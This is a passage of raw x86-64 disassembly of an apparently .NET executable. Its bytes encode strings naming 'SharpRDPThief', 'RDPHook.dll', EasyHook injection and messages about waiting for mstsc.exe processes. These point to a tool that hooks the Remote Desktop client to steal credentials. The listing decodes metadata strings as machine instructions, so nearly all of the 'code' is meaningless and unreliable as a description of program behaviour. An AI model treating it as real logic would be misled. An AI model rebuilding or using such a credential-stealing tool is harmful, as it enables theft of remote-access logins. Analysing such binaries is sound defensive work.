   1400025f3:	00 55 00             	add    %dl,0x0(%rbp)
   1400025f6:	37                   	(bad)
   1400025f7:	00 84 00 00 00 00 3c 	add    %al,0x3c000000(%rax,%rax,1)
   1400025fe:	4d 6f                	rex.WRB outsl (%rsi),(%dx)
   140002600:	64 75 6c             	fs jne 0x14000266f
   140002603:	65 3e 00 53 68       	gs add %dl,%gs:0x68(%rbx)
   140002608:	61                   	(bad)
   140002609:	72 70                	jb     0x14000267b
   14000260b:	52                   	push   %rdx
   14000260c:	44 50                	rex.R push %rax
   14000260e:	54                   	push   %rsp
   14000260f:	68 69 65 66 2e       	push   $0x2e666569
   140002614:	65 78 65             	gs js  0x14000267c
   140002617:	00 50 72             	add    %dl,0x72(%rax)
   14000261a:	6f                   	outsl  (%rsi),(%dx)
   14000261b:	67 72 61             	addr32 jb 0x14000267f
   14000261e:	6d                   	insl   (%dx),(%rdi)
   14000261f:	00 53 68             	add    %dl,0x68(%rbx)
   140002622:	61                   	(bad)
   140002623:	72 70                	jb     0x140002695
   140002625:	52                   	push   %rdx
   140002626:	44 50                	rex.R push %rax
   140002628:	54                   	push   %rsp
   140002629:	68 69 65 66 00       	push   $0x666569
   14000262e:	6d                   	insl   (%dx),(%rdi)
   14000262f:	73 63                	jae    0x140002694
   140002631:	6f                   	outsl  (%rsi),(%dx)
   140002632:	72 6c                	jb     0x1400026a0
   140002634:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%rdx),%esp
   14000263b:	65 6d                	gs insl (%dx),(%rdi)
   14000263d:	00 4f 62             	add    %cl,0x62(%rdi)
   140002640:	6a 65                	push   $0x65
   140002642:	63 74 00 4d          	movsxd 0x4d(%rax,%rax,1),%esi
   140002646:	61                   	(bad)
   140002647:	69 6e 00 70 72 69 6e 	imul   $0x6e697270,0x0(%rsi),%ebp
   14000264e:	74 4d                	je     0x14000269d
   140002650:	65 73 73             	gs jae 0x1400026c6
   140002653:	61                   	(bad)
   140002654:	67 65 00 2e          	add    %ch,%gs:(%esi)
   140002658:	63 74 6f 72          	movsxd 0x72(%rdi,%rbp,2),%esi
   14000265c:	00 61 72             	add    %ah,0x72(%rcx)
   14000265f:	67 73 00             	addr32 jae 0x140002662
   140002662:	53                   	push   %rbx
   140002663:	79 73                	jns    0x1400026d8
   140002665:	74 65                	je     0x1400026cc
   140002667:	6d                   	insl   (%dx),(%rdi)
   140002668:	2e 52                	cs push %rdx
   14000266a:	75 6e                	jne    0x1400026da
   14000266c:	74 69                	je     0x1400026d7
   14000266e:	6d                   	insl   (%dx),(%rdi)
   14000266f:	65 2e 56             	gs cs push %rsi
   140002672:	65 72 73             	gs jb  0x1400026e8
   140002675:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%rdi),%ebp
   14000267c:	54                   	push   %rsp
   14000267d:	61                   	(bad)
   14000267e:	72 67                	jb     0x1400026e7
   140002680:	65 74 46             	gs je  0x1400026c9
   140002683:	72 61                	jb     0x1400026e6
   140002685:	6d                   	insl   (%dx),(%rdi)
   140002686:	65 77 6f             	gs ja  0x1400026f8
   140002689:	72 6b                	jb     0x1400026f6
   14000268b:	41 74 74             	rex.B je 0x140002702
   14000268e:	72 69                	jb     0x1400026f9
   140002690:	62 75 74 65 00       	(bad)
   140002695:	53                   	push   %rbx
   140002696:	79 73                	jns    0x14000270b
   140002698:	74 65                	je     0x1400026ff
   14000269a:	6d                   	insl   (%dx),(%rdi)
   14000269b:	2e 52                	cs push %rdx
   14000269d:	65 66 6c             	gs data16 insb (%dx),(%rdi)
   1400026a0:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
   1400026a5:	6e                   	outsb  (%rsi),(%dx)
   1400026a6:	00 41 73             	add    %al,0x73(%rcx)
   1400026a9:	73 65                	jae    0x140002710
   1400026ab:	6d                   	insl   (%dx),(%rdi)
   1400026ac:	62 6c 79 54 69       	(bad)
   1400026b1:	74 6c                	je     0x14000271f
   1400026b3:	65 41 74 74          	gs rex.B je 0x14000272b
   1400026b7:	72 69                	jb     0x140002722
   1400026b9:	62 75 74 65 00       	(bad)
   1400026be:	41 73 73             	rex.B jae 0x140002734
   1400026c1:	65 6d                	gs insl (%dx),(%rdi)
   1400026c3:	62 6c 79 44 65       	(bad)
   1400026c8:	73 63                	jae    0x14000272d
   1400026ca:	72 69                	jb     0x140002735
   1400026cc:	70 74                	jo     0x140002742
   1400026ce:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%rdi),%ebp
   1400026d5:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%rdx),%esp
   1400026dc:	73 73                	jae    0x140002751
   1400026de:	65 6d                	gs insl (%dx),(%rdi)
   1400026e0:	62 6c 79 43 6f       	(bad)
   1400026e5:	6e                   	outsb  (%rsi),(%dx)
   1400026e6:	66 69 67 75 72 61    	imul   $0x6172,0x75(%rdi),%sp
   1400026ec:	74 69                	je     0x140002757
   1400026ee:	6f                   	outsl  (%rsi),(%dx)
   1400026ef:	6e                   	outsb  (%rsi),(%dx)
   1400026f0:	41 74 74             	rex.B je 0x140002767
   1400026f3:	72 69                	jb     0x14000275e
   1400026f5:	62 75 74 65 00       	(bad)
   1400026fa:	41 73 73             	rex.B jae 0x140002770
   1400026fd:	65 6d                	gs insl (%dx),(%rdi)
   1400026ff:	62 6c 79 43 6f       	(bad)
   140002704:	6d                   	insl   (%dx),(%rdi)
   140002705:	70 61                	jo     0x140002768
   140002707:	6e                   	outsb  (%rsi),(%dx)
   140002708:	79 41                	jns    0x14000274b
   14000270a:	74 74                	je     0x140002780
   14000270c:	72 69                	jb     0x140002777
   14000270e:	62 75 74 65 00       	(bad)
   140002713:	41 73 73             	rex.B jae 0x140002789
   140002716:	65 6d                	gs insl (%dx),(%rdi)
   140002718:	62 6c 79 50 72       	(bad)
   14000271d:	6f                   	outsl  (%rsi),(%dx)
   14000271e:	64 75 63             	fs jne 0x140002784
   140002721:	74 41                	je     0x140002764
   140002723:	74 74                	je     0x140002799
   140002725:	72 69                	jb     0x140002790
   140002727:	62 75 74 65 00       	(bad)
   14000272c:	41 73 73             	rex.B jae 0x1400027a2
   14000272f:	65 6d                	gs insl (%dx),(%rdi)
   140002731:	62 6c 79 43 6f       	(bad)
   140002736:	70 79                	jo     0x1400027b1
   140002738:	72 69                	jb     0x1400027a3
   14000273a:	67 68 74 41 74 74    	addr32 push $0x74744174
   140002740:	72 69                	jb     0x1400027ab
   140002742:	62 75 74 65 00       	(bad)
   140002747:	41 73 73             	rex.B jae 0x1400027bd
   14000274a:	65 6d                	gs insl (%dx),(%rdi)
   14000274c:	62 6c 79 54 72       	(bad)
   140002751:	61                   	(bad)
   140002752:	64 65 6d             	fs gs insl (%dx),(%rdi)
   140002755:	61                   	(bad)
   140002756:	72 6b                	jb     0x1400027c3
   140002758:	41 74 74             	rex.B je 0x1400027cf
   14000275b:	72 69                	jb     0x1400027c6
   14000275d:	62 75 74 65 00       	(bad)
   140002762:	41 73 73             	rex.B jae 0x1400027d8
   140002765:	65 6d                	gs insl (%dx),(%rdi)
   140002767:	62 6c 79 43 75       	(bad)
   14000276c:	6c                   	insb   (%dx),(%rdi)
   14000276d:	74 75                	je     0x1400027e4
   14000276f:	72 65                	jb     0x1400027d6
   140002771:	41 74 74             	rex.B je 0x1400027e8
   140002774:	72 69                	jb     0x1400027df
   140002776:	62 75 74 65 00       	(bad)
   14000277b:	53                   	push   %rbx
   14000277c:	79 73                	jns    0x1400027f1
   14000277e:	74 65                	je     0x1400027e5
   140002780:	6d                   	insl   (%dx),(%rdi)
   140002781:	2e 52                	cs push %rdx
   140002783:	75 6e                	jne    0x1400027f3
   140002785:	74 69                	je     0x1400027f0
   140002787:	6d                   	insl   (%dx),(%rdi)
   140002788:	65 2e 49 6e          	gs rex.WB outsb %gs:(%rsi),(%dx)
   14000278c:	74 65                	je     0x1400027f3
   14000278e:	72 6f                	jb     0x1400027ff
   140002790:	70 53                	jo     0x1400027e5
   140002792:	65 72 76             	gs jb  0x14000280b
   140002795:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%rbx),%esp
   14000279c:	6d                   	insl   (%dx),(%rdi)
   14000279d:	56                   	push   %rsi
   14000279e:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%rbx),%esi
   1400027a5:	74 74                	je     0x14000281b
   1400027a7:	72 69                	jb     0x140002812
   1400027a9:	62 75 74 65 00       	(bad)
   1400027ae:	47 75 69             	rex.RXB jne 0x14000281a
   1400027b1:	64 41 74 74          	fs rex.B je 0x140002829
   1400027b5:	72 69                	jb     0x140002820
   1400027b7:	62 75 74 65 00       	(bad)
   1400027bc:	41 73 73             	rex.B jae 0x140002832
   1400027bf:	65 6d                	gs insl (%dx),(%rdi)
   1400027c1:	62 6c 79 56 65       	(bad)
   1400027c6:	72 73                	jb     0x14000283b
   1400027c8:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%rdi),%ebp
   1400027cf:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%rdx),%esp
   1400027d6:	73 73                	jae    0x14000284b
   1400027d8:	65 6d                	gs insl (%dx),(%rdi)
   1400027da:	62 6c 79 46 69       	(bad)
   1400027df:	6c                   	insb   (%dx),(%rdi)
   1400027e0:	65 56                	gs push %rsi
   1400027e2:	65 72 73             	gs jb  0x140002858
   1400027e5:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%rdi),%ebp
   1400027ec:	69 62 75 74 65 00 53 	imul   $0x53006574,0x75(%rdx),%esp
   1400027f3:	79 73                	jns    0x140002868
   1400027f5:	74 65                	je     0x14000285c
   1400027f7:	6d                   	insl   (%dx),(%rdi)
   1400027f8:	2e 44 69 61 67 6e 6f 	cs imul $0x74736f6e,0x67(%rcx),%r12d
   1400027ff:	73 74 
   140002801:	69 63 73 00 44 65 62 	imul   $0x62654400,0x73(%rbx),%esp
   140002808:	75 67                	jne    0x140002871
   14000280a:	67 61                	addr32 (bad)
   14000280c:	62 6c 65 41 74       	(bad)
   140002811:	74 72                	je     0x140002885
   140002813:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%rdx),%esp
   14000281a:	65 62 75 67 67 69    	(bad)
   140002820:	6e                   	outsb  (%rsi),(%dx)
   140002821:	67 4d 6f             	rex.WRB outsl (%esi),(%dx)
   140002824:	64 65 73 00          	fs gs jae 0x140002828
   140002828:	53                   	push   %rbx
   140002829:	79 73                	jns    0x14000289e
   14000282b:	74 65                	je     0x140002892
   14000282d:	6d                   	insl   (%dx),(%rdi)
   14000282e:	2e 52                	cs push %rdx
   140002830:	75 6e                	jne    0x1400028a0
   140002832:	74 69                	je     0x14000289d
   140002834:	6d                   	insl   (%dx),(%rdi)
   140002835:	65 2e 43 6f          	gs rex.XB outsl %gs:(%rsi),(%dx)
   140002839:	6d                   	insl   (%dx),(%rdi)
   14000283a:	70 69                	jo     0x1400028a5
   14000283c:	6c                   	insb   (%dx),(%rdi)
   14000283d:	65 72 53             	gs jb  0x140002893
   140002840:	65 72 76             	gs jb  0x1400028b9
   140002843:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%rbx),%esp
   14000284a:	6d                   	insl   (%dx),(%rdi)
   14000284b:	70 69                	jo     0x1400028b6
   14000284d:	6c                   	insb   (%dx),(%rdi)
   14000284e:	61                   	(bad)
   14000284f:	74 69                	je     0x1400028ba
   140002851:	6f                   	outsl  (%rsi),(%dx)
   140002852:	6e                   	outsb  (%rsi),(%dx)
   140002853:	52                   	push   %rdx
   140002854:	65 6c                	gs insb (%dx),(%rdi)
   140002856:	61                   	(bad)
   140002857:	78 61                	js     0x1400028ba
   140002859:	74 69                	je     0x1400028c4
   14000285b:	6f                   	outsl  (%rsi),(%dx)
   14000285c:	6e                   	outsb  (%rsi),(%dx)
   14000285d:	73 41                	jae    0x1400028a0
   14000285f:	74 74                	je     0x1400028d5
   140002861:	72 69                	jb     0x1400028cc
   140002863:	62 75 74 65 00       	(bad)
   140002868:	52                   	push   %rdx
   140002869:	75 6e                	jne    0x1400028d9
   14000286b:	74 69                	je     0x1400028d6
   14000286d:	6d                   	insl   (%dx),(%rdi)
   14000286e:	65 43 6f             	rex.XB outsl %gs:(%rsi),(%dx)
   140002871:	6d                   	insl   (%dx),(%rdi)
   140002872:	70 61                	jo     0x1400028d5
   140002874:	74 69                	je     0x1400028df
   140002876:	62 69 6c 69 74       	(bad)
   14000287b:	79 41                	jns    0x1400028be
   14000287d:	74 74                	je     0x1400028f3
   14000287f:	72 69                	jb     0x1400028ea
   140002881:	62 75 74 65 00       	(bad)
   140002886:	53                   	push   %rbx
   140002887:	79 73                	jns    0x1400028fc
   140002889:	74 65                	je     0x1400028f0
   14000288b:	6d                   	insl   (%dx),(%rdi)
   14000288c:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   14000288f:	6c                   	insb   (%dx),(%rdi)
   140002890:	6c                   	insb   (%dx),(%rdi)
   140002891:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
   140002896:	6e                   	outsb  (%rsi),(%dx)
   140002897:	73 2e                	jae    0x1400028c7
   140002899:	47                   	rex.RXB
   14000289a:	65 6e                	outsb  %gs:(%rsi),(%dx)
   14000289c:	65 72 69             	gs jb  0x140002908
   14000289f:	63 00                	movsxd (%rax),%eax
   1400028a1:	4c 69 73 74 60 31 00 	imul   $0x50003160,0x74(%rbx),%r14
   1400028a8:	50 
   1400028a9:	72 6f                	jb     0x14000291a
   1400028ab:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400028ae:	73 00                	jae    0x1400028b0
   1400028b0:	43 6f                	rex.XB outsl (%rsi),(%dx)
   1400028b2:	6e                   	outsb  (%rsi),(%dx)
   1400028b3:	73 6f                	jae    0x140002924
   1400028b5:	6c                   	insb   (%dx),(%rdi)
   1400028b6:	65 00 57 72          	add    %dl,%gs:0x72(%rdi)
   1400028ba:	69 74 65 4c 69 6e 65 	imul   $0x656e69,0x4c(%rbp,%riz,2),%esi
   1400028c1:	00 
   1400028c2:	53                   	push   %rbx
   1400028c3:	79 73                	jns    0x140002938
   1400028c5:	74 65                	je     0x14000292c
   1400028c7:	6d                   	insl   (%dx),(%rdi)
   1400028c8:	2e 53                	cs push %rbx
   1400028ca:	65 63 75 72          	movsxd %gs:0x72(%rbp),%esi
   1400028ce:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%rcx,%rdi,2),%esi
   1400028d5:	6e 
   1400028d6:	63 69 70             	movsxd 0x70(%rcx),%ebp
   1400028d9:	61                   	(bad)
   1400028da:	6c                   	insb   (%dx),(%rdi)
   1400028db:	00 57 65             	add    %dl,0x65(%rdi)
   1400028de:	6c                   	insb   (%dx),(%rdi)
   1400028df:	6c                   	insb   (%dx),(%rdi)
   1400028e0:	4b 6e                	rex.WXB outsb (%rsi),(%dx)
   1400028e2:	6f                   	outsl  (%rsi),(%dx)
   1400028e3:	77 6e                	ja     0x140002953
   1400028e5:	53                   	push   %rbx
   1400028e6:	69 64 54 79 70 65 00 	imul   $0x45006570,0x79(%rsp,%rdx,2),%esp
   1400028ed:	45 
   1400028ee:	61                   	(bad)
   1400028ef:	73 79                	jae    0x14000296a
   1400028f1:	48 6f                	rex.W outsl (%rsi),(%dx)
   1400028f3:	6f                   	outsl  (%rsi),(%dx)
   1400028f4:	6b 00 52             	imul   $0x52,(%rax),%eax
   1400028f7:	65 6d                	gs insl (%dx),(%rdi)
   1400028f9:	6f                   	outsl  (%rsi),(%dx)
   1400028fa:	74 65                	je     0x140002961
   1400028fc:	48 6f                	rex.W outsl (%rsi),(%dx)
   1400028fe:	6f                   	outsl  (%rsi),(%dx)
   1400028ff:	6b 69 6e 67          	imul   $0x67,0x6e(%rcx),%ebp
   140002903:	00 53 79             	add    %dl,0x79(%rbx)
   140002906:	73 74                	jae    0x14000297c
   140002908:	65 6d                	gs insl (%dx),(%rdi)
   14000290a:	2e 52                	cs push %rdx
   14000290c:	75 6e                	jne    0x14000297c
   14000290e:	74 69                	je     0x140002979
   140002910:	6d                   	insl   (%dx),(%rdi)
   140002911:	65 2e 52             	gs cs push %rdx
   140002914:	65 6d                	gs insl (%dx),(%rdi)
   140002916:	6f                   	outsl  (%rsi),(%dx)
   140002917:	74 69                	je     0x140002982
   140002919:	6e                   	outsb  (%rsi),(%dx)
   14000291a:	67 00 53 79          	add    %dl,0x79(%ebx)
   14000291e:	73 74                	jae    0x140002994
   140002920:	65 6d                	gs insl (%dx),(%rdi)
   140002922:	2e 52                	cs push %rdx
   140002924:	75 6e                	jne    0x140002994
   140002926:	74 69                	je     0x140002991
   140002928:	6d                   	insl   (%dx),(%rdi)
   140002929:	65 2e 52             	gs cs push %rdx
   14000292c:	65 6d                	gs insl (%dx),(%rdi)
   14000292e:	6f                   	outsl  (%rsi),(%dx)
   14000292f:	74 69                	je     0x14000299a
   140002931:	6e                   	outsb  (%rsi),(%dx)
   140002932:	67 2e 43 68 61 6e 6e 	addr32 cs rex.XB push $0x656e6e61
   140002939:	65 
   14000293a:	6c                   	insb   (%dx),(%rdi)
   14000293b:	73 2e                	jae    0x14000296b
   14000293d:	49 70 63             	rex.WB jo 0x1400029a3
   140002940:	00 49 70             	add    %cl,0x70(%rcx)
   140002943:	63 53 65             	movsxd 0x65(%rbx),%edx
   140002946:	72 76                	jb     0x1400029be
   140002948:	65 72 43             	gs jb  0x14000298e
   14000294b:	68 61 6e 6e 65       	push   $0x656e6e61
   140002950:	6c                   	insb   (%dx),(%rdi)
   140002951:	00 57 65             	add    %dl,0x65(%rdi)
   140002954:	6c                   	insb   (%dx),(%rdi)
   140002955:	6c                   	insb   (%dx),(%rdi)
   140002956:	4b 6e                	rex.WXB outsb (%rsi),(%dx)
   140002958:	6f                   	outsl  (%rsi),(%dx)
   140002959:	77 6e                	ja     0x1400029c9
   14000295b:	4f 62 6a 65 63 74    	(bad)
   140002961:	4d 6f                	rex.WRB outsl (%rsi),(%dx)
   140002963:	64 65 00 49 70       	fs add %cl,%gs:0x70(%rcx)
   140002968:	63 43 72             	movsxd 0x72(%rbx),%eax
   14000296b:	65 61                	gs (bad)
   14000296d:	74 65                	je     0x1400029d4
   14000296f:	53                   	push   %rbx
   140002970:	65 72 76             	gs jb  0x1400029e9
   140002973:	65 72 00             	gs jb  0x140002976
   140002976:	52                   	push   %rdx
   140002977:	44 50                	rex.R push %rax
   140002979:	48 6f                	rex.W outsl (%rsi),(%dx)
   14000297b:	6f                   	outsl  (%rsi),(%dx)
   14000297c:	6b 00 53             	imul   $0x53,(%rax),%eax
   14000297f:	65 72 76             	gs jb  0x1400029f8
   140002982:	65 72 49             	gs jb  0x1400029ce
   140002985:	6e                   	outsb  (%rsi),(%dx)
   140002986:	74 65                	je     0x1400029ed
   140002988:	72 66                	jb     0x1400029f0
   14000298a:	61                   	(bad)
   14000298b:	63 65 00             	movsxd 0x0(%rbp),%esp
   14000298e:	41 73 73             	rex.B jae 0x140002a04
   140002991:	65 6d                	gs insl (%dx),(%rdi)
   140002993:	62 6c 79 00 47       	(bad)
   140002998:	65 74 45             	gs je  0x1400029e0
   14000299b:	78 65                	js     0x140002a02
   14000299d:	63 75 74             	movsxd 0x74(%rbp),%esi
   1400029a0:	69 6e 67 41 73 73 65 	imul   $0x65737341,0x67(%rsi),%ebp
   1400029a7:	6d                   	insl   (%dx),(%rdi)
   1400029a8:	62 6c 79 00 67       	(bad)
   1400029ad:	65 74 5f             	gs je  0x140002a0f
   1400029b0:	4c 6f                	rex.WR outsl (%rsi),(%dx)
   1400029b2:	63 61 74             	movsxd 0x74(%rcx),%esp
   1400029b5:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%rdi),%ebp
   1400029bc:	74 65                	je     0x140002a23
   1400029be:	6d                   	insl   (%dx),(%rdi)
   1400029bf:	2e 49                	cs rex.WB
   1400029c1:	4f 00 50 61          	rex.WRXB add %r10b,0x61(%r8)
   1400029c5:	74 68                	je     0x140002a2f
   1400029c7:	00 47 65             	add    %al,0x65(%rdi)
   1400029ca:	74 44                	je     0x140002a10
   1400029cc:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%rdx),%esi
   1400029d3:	79 4e                	jns    0x140002a23
   1400029d5:	61                   	(bad)
   1400029d6:	6d                   	insl   (%dx),(%rdi)
   1400029d7:	65 00 43 6f          	add    %al,%gs:0x6f(%rbx)
   1400029db:	6d                   	insl   (%dx),(%rdi)
   1400029dc:	62 69 6e 65 00       	(bad)
   1400029e1:	43 6c                	rex.XB insb (%dx),(%rdi)
   1400029e3:	65 61                	gs (bad)
   1400029e5:	72 00                	jb     0x1400029e7
   1400029e7:	47                   	rex.RXB
   1400029e8:	65 74 50             	gs je  0x140002a3b
   1400029eb:	72 6f                	jb     0x140002a5c
   1400029ed:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400029f0:	73 65                	jae    0x140002a57
   1400029f2:	73 00                	jae    0x1400029f4
   1400029f4:	53                   	push   %rbx
   1400029f5:	79 73                	jns    0x140002a6a
   1400029f7:	74 65                	je     0x140002a5e
   1400029f9:	6d                   	insl   (%dx),(%rdi)
   1400029fa:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   1400029fd:	72 65                	jb     0x140002a64
   1400029ff:	00 53 79             	add    %dl,0x79(%rbx)
   140002a02:	73 74                	jae    0x140002a78
   140002a04:	65 6d                	gs insl (%dx),(%rdi)
   140002a06:	2e 4c 69 6e 71 00 45 	cs imul $0x756e4500,0x71(%rsi),%r13
   140002a0d:	6e 75 
   140002a0f:	6d                   	insl   (%dx),(%rdi)
   140002a10:	65 72 61             	gs jb  0x140002a74
   140002a13:	62 6c 65 00 49       	(bad)
   140002a18:	45 6e                	rex.RB outsb (%rsi),(%dx)
   140002a1a:	75 6d                	jne    0x140002a89
   140002a1c:	65 72 61             	gs jb  0x140002a80
   140002a1f:	62 6c 65 60 31       	(bad)
   140002a24:	00 54 6f 4c          	add    %dl,0x4c(%rdi,%rbp,2)
   140002a28:	69 73 74 00 67 65 74 	imul   $0x74656700,0x74(%rbx),%esi
   140002a2f:	5f                   	pop    %rdi
   140002a30:	49 74 65             	rex.WB je 0x140002a98
   140002a33:	6d                   	insl   (%dx),(%rdi)
   140002a34:	00 67 65             	add    %ah,0x65(%rdi)
   140002a37:	74 5f                	je     0x140002a98
   140002a39:	49                   	rex.WB
   140002a3a:	64 00 41 64          	add    %al,%fs:0x64(%rcx)
   140002a3e:	64 00 67 65          	add    %ah,%fs:0x65(%rdi)
   140002a42:	74 5f                	je     0x140002aa3
   140002a44:	50                   	push   %rax
   140002a45:	72 6f                	jb     0x140002ab6
   140002a47:	63 65 73             	movsxd 0x73(%rbp),%esp
   140002a4a:	73 4e                	jae    0x140002a9a
   140002a4c:	61                   	(bad)
   140002a4d:	6d                   	insl   (%dx),(%rdi)
   140002a4e:	65 00 53 74          	add    %dl,%gs:0x74(%rbx)
   140002a52:	72 69                	jb     0x140002abd
   140002a54:	6e                   	outsb  (%rsi),(%dx)
   140002a55:	67 00 6f 70          	add    %ch,0x70(%edi)
   140002a59:	5f                   	pop    %rdi
   140002a5a:	45 71 75             	rex.RB jno 0x140002ad2
   140002a5d:	61                   	(bad)
   140002a5e:	6c                   	insb   (%dx),(%rdi)
   140002a5f:	69 74 79 00 49 6e 64 	imul   $0x65646e49,0x0(%rcx,%rdi,2),%esi
   140002a66:	65 
   140002a67:	78 4f                	js     0x140002ab8
   140002a69:	66 00 49 6e          	data16 add %cl,0x6e(%rcx)
   140002a6d:	74 33                	je     0x140002aa2
   140002a6f:	32 00                	xor    (%rax),%al
   140002a71:	49 6e                	rex.WB outsb (%rsi),(%dx)
   140002a73:	6a 65                	push   $0x65
   140002a75:	63 74 00 43          	movsxd 0x43(%rax,%rax,1),%esi
   140002a79:	6f                   	outsl  (%rsi),(%dx)
   140002a7a:	6e                   	outsb  (%rsi),(%dx)
   140002a7b:	73 6f                	jae    0x140002aec
   140002a7d:	6c                   	insb   (%dx),(%rdi)
   140002a7e:	65 43 6f             	rex.XB outsl %gs:(%rsi),(%dx)
   140002a81:	6c                   	insb   (%dx),(%rdi)
   140002a82:	6f                   	outsl  (%rsi),(%dx)
   140002a83:	72 00                	jb     0x140002a85
   140002a85:	73 65                	jae    0x140002aec
   140002a87:	74 5f                	je     0x140002ae8
   140002a89:	46 6f                	rex.RX outsl (%rsi),(%dx)
   140002a8b:	72 65                	jb     0x140002af2
   140002a8d:	67 72 6f             	addr32 jb 0x140002aff
   140002a90:	75 6e                	jne    0x140002b00
   140002a92:	64 43 6f             	rex.XB outsl %fs:(%rsi),(%dx)
   140002a95:	6c                   	insb   (%dx),(%rdi)
   140002a96:	6f                   	outsl  (%rsi),(%dx)
   140002a97:	72 00                	jb     0x140002a99
   140002a99:	52                   	push   %rdx
   140002a9a:	65 73 65             	gs jae 0x140002b02
   140002a9d:	74 43                	je     0x140002ae2
   140002a9f:	6f                   	outsl  (%rsi),(%dx)
   140002aa0:	6c                   	insb   (%dx),(%rdi)
   140002aa1:	6f                   	outsl  (%rsi),(%dx)
   140002aa2:	72 00                	jb     0x140002aa4
   140002aa4:	54                   	push   %rsp
   140002aa5:	6f                   	outsl  (%rsi),(%dx)
   140002aa6:	53                   	push   %rbx
   140002aa7:	74 72                	je     0x140002b1b
   140002aa9:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%rsi),%ebp
   140002ab0:	5f                   	pop    %rdi
   140002ab1:	43 6f                	rex.XB outsl (%rsi),(%dx)
   140002ab3:	75 6e                	jne    0x140002b23
   140002ab5:	74 00                	je     0x140002ab7
   140002ab7:	52                   	push   %rdx
   140002ab8:	65 6d                	gs insl (%dx),(%rdi)
   140002aba:	6f                   	outsl  (%rsi),(%dx)
   140002abb:	76 65                	jbe    0x140002b22
   140002abd:	00 53 79             	add    %dl,0x79(%rbx)
   140002ac0:	73 74                	jae    0x140002b36
   140002ac2:	65 6d                	gs insl (%dx),(%rdi)
   140002ac4:	2e 54                	cs push %rsp
   140002ac6:	68 72 65 61 64       	push   $0x64616572
   140002acb:	69 6e 67 00 54 68 72 	imul   $0x72685400,0x67(%rsi),%ebp
   140002ad2:	65 61                	gs (bad)
   140002ad4:	64 00 53 6c          	add    %dl,%fs:0x6c(%rbx)
   140002ad8:	65 65 70 00          	gs gs jo 0x140002adc
   140002adc:	45 78 63             	rex.RB js 0x140002b42
   140002adf:	65 70 74             	gs jo  0x140002b56
   140002ae2:	69 6f 6e 00 00 00 00 	imul   $0x0,0x6e(%rdi),%ebp
   140002ae9:	4d 5b                	rex.WRB pop %r11
   140002aeb:	00 2a                	add    %ch,(%rdx)
   140002aed:	00 5d 00             	add    %bl,0x0(%rbp)
   140002af0:	20 00                	and    %al,(%rax)
   140002af2:	57                   	push   %rdi
   140002af3:	00 61 00             	add    %ah,0x0(%rcx)
   140002af6:	69 00 74 00 69 00    	imul   $0x690074,(%rax),%eax
   140002afc:	6e                   	outsb  (%rsi),(%dx)
   140002afd:	00 67 00             	add    %ah,0x0(%rdi)
   140002b00:	20 00                	and    %al,(%rax)
   140002b02:	66 00 6f 00          	data16 add %ch,0x0(%rdi)
   140002b06:	72 00                	jb     0x140002b08
   140002b08:	20 00                	and    %al,(%rax)
   140002b0a:	6d                   	insl   (%dx),(%rdi)
   140002b0b:	00 73 00             	add    %dh,0x0(%rbx)
   140002b0e:	74 00                	je     0x140002b10
   140002b10:	73 00                	jae    0x140002b12
   140002b12:	63 00                	movsxd (%rax),%eax
   140002b14:	2e 00 65 00          	cs add %ah,0x0(%rbp)
   140002b18:	78 00                	js     0x140002b1a
   140002b1a:	65 00 20             	add    %ah,%gs:(%rax)
   140002b1d:	00 70 00             	add    %dh,0x0(%rax)
   140002b20:	72 00                	jb     0x140002b22
   140002b22:	6f                   	outsl  (%rsi),(%dx)
   140002b23:	00 63 00             	add    %ah,0x0(%rbx)
   140002b26:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   140002b2a:	73 00                	jae    0x140002b2c
   140002b2c:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   140002b30:	2e 00 2e             	cs add %ch,(%rsi)
   140002b33:	00 2e                	add    %ch,(%rsi)
   140002b35:	00 00                	add    %al,(%rax)
   140002b37:	17                   	(bad)
   140002b38:	52                   	push   %rdx
   140002b39:	00 44 00 50          	add    %al,0x50(%rax,%rax,1)
   140002b3d:	00 48 00             	add    %cl,0x0(%rax)
   140002b40:	6f                   	outsl  (%rsi),(%dx)
   140002b41:	00 6f 00             	add    %ch,0x0(%rdi)
   140002b44:	6b 00 2e             	imul   $0x2e,(%rax),%eax
   140002b47:	00 64 00 6c          	add    %ah,0x6c(%rax,%rax,1)
   140002b4b:	00 6c 00 00          	add    %ch,0x0(%rax,%rax,1)
   140002b4f:	0b 6d 00             	or     0x0(%rbp),%ebp
   140002b52:	73 00                	jae    0x140002b54
   140002b54:	74 00                	je     0x140002b56
   140002b56:	73 00                	jae    0x140002b58
   140002b58:	63 00                	movsxd (%rax),%eax
   140002b5a:	00 53 5b             	add    %dl,0x5b(%rbx)
   140002b5d:	00 2a                	add    %ch,(%rdx)
   140002b5f:	00 5d 00             	add    %bl,0x0(%rbp)
   140002b62:	20 00                	and    %al,(%rax)
   140002b64:	41 00 74 00 74       	add    %sil,0x74(%r8,%rax,1)
   140002b69:	00 65 00             	add    %ah,0x0(%rbp)
   140002b6c:	6d                   	insl   (%dx),(%rdi)
   140002b6d:	00 70 00             	add    %dh,0x0(%rax)
   140002b70:	74 00                	je     0x140002b72
   140002b72:	69 00 6e 00 67 00    	imul   $0x67006e,(%rax),%eax
   140002b78:	20 00                	and    %al,(%rax)
   140002b7a:	74 00                	je     0x140002b7c
